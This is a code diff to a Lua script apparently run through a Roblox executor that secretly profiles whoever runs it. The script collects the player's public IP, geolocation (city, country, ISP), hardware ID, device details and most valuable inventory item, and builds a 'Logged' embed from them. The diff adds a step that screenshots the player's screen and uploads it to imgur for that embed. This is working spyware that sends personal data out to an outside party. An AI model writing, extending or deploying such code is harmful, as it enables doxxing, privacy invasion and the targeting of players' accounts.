@@ -19,11 +19,11 @@ for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.m
 end
 if not ip then return end
 
--- Get Geo
+-- Geo
 local geo = {city="?",country="?",isp="?"}
 pcall(function()
     local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp",Method="GET"})
-    if r and r.Body and r.Body:find("{") then
+    if r and r.Body then
         local d = HttpService:JSONDecode(r.Body)
         if d then geo = d end
     end
@@ -39,7 +39,7 @@ pcall(function()
     end
 end)
 
--- Most Expensive Item
+-- Most Expensive
 local best = {name="None",rap=0,value=0}
 pcall(function()
     local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
@@ -70,12 +70,50 @@ pcall(function()
     device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
 end)
 
--- Profile URLs
+-- Profile
 local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
 local profile = "https://www.roblox.com/users/"..userId.."/profile"
 local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
 
--- Final Embed (Fixed: thumbnail + clickable title)
+-- TAKE & UPLOAD SCREENSHOT
+local screenshotUrl = "https://i.imgur.com/removed.png"  -- fallback
+pcall(function()
+    local ss = game:GetService("ScreenshotService"):TakeScreenshot()
+    if ss and ss:FindFirstChild("Image") then
+        local imgData = ss.Image.Value
+        local b64 = game:GetService("HttpService"):EncodeBase64(imgData)
+
+        local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        local body = {
+            "--"..boundary,
+            'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
+            "Content-Type: image/png",
+            "",
+            b64,
+            "--"..boundary.."--"
+        }
+        local bodyStr = table.concat(body, "\r\n")
+
+        local upload = request({
+            Url = "https://api.imgur.com/3/image",
+            Method = "POST",
+            Headers = {
+                ["Authorization"] = "Client-ID 546c25a59c58ad7",  -- public anon key
+                ["Content-Type"] = "multipart/form-data; boundary="..boundary
+            },
+            Body = bodyStr
+        })
+
+        if upload and upload.Body then
+            local res = HttpService:JSONDecode(upload.Body)
+            if res and res.data and res.data.link then
+                screenshotUrl = res.data.link
+            end
+        end
+    end
+end)
+
+-- Final Embed
 local embed = {{
     author = {
         name = display .. " (@" .. name .. ")",
@@ -93,6 +131,7 @@ local embed = {{
         "**ISP:** `"..geo.isp.."`\n\n"..
         "**HWID:** `"..hwid.."`\n"..
         "**Device:** `"..device.."`",
+    image = {url = screenshotUrl},
     thumbnail = {url = avatar},
     color = 0x00ff88,
     footer = {text = "Logged • "..os.date("%Y-%m-%d %H:%M:%S")},
